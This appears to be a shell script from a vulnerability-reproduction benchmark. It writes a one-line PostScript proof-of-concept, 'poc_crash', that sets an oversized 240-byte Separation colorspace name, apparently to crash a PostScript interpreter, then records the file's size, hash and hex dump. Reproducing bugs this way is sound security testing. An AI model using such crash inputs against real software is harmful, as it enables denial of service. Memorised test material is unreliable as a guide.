set -eu
rm -rf /CybinGym_workdir/cases /CybinGym_workdir/poc_crash.fpe
printf '/s 240 string def 0 1 239{s exch 1 put}for[/Separation s/DeviceCMYK{dup dup dup}]setcolorspace showpage\n' > /CybinGym_workdir/poc_crash
stat -c 'path=%n size=%s mode=%A' /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
xxd -g1 /CybinGym_workdir/poc_crash
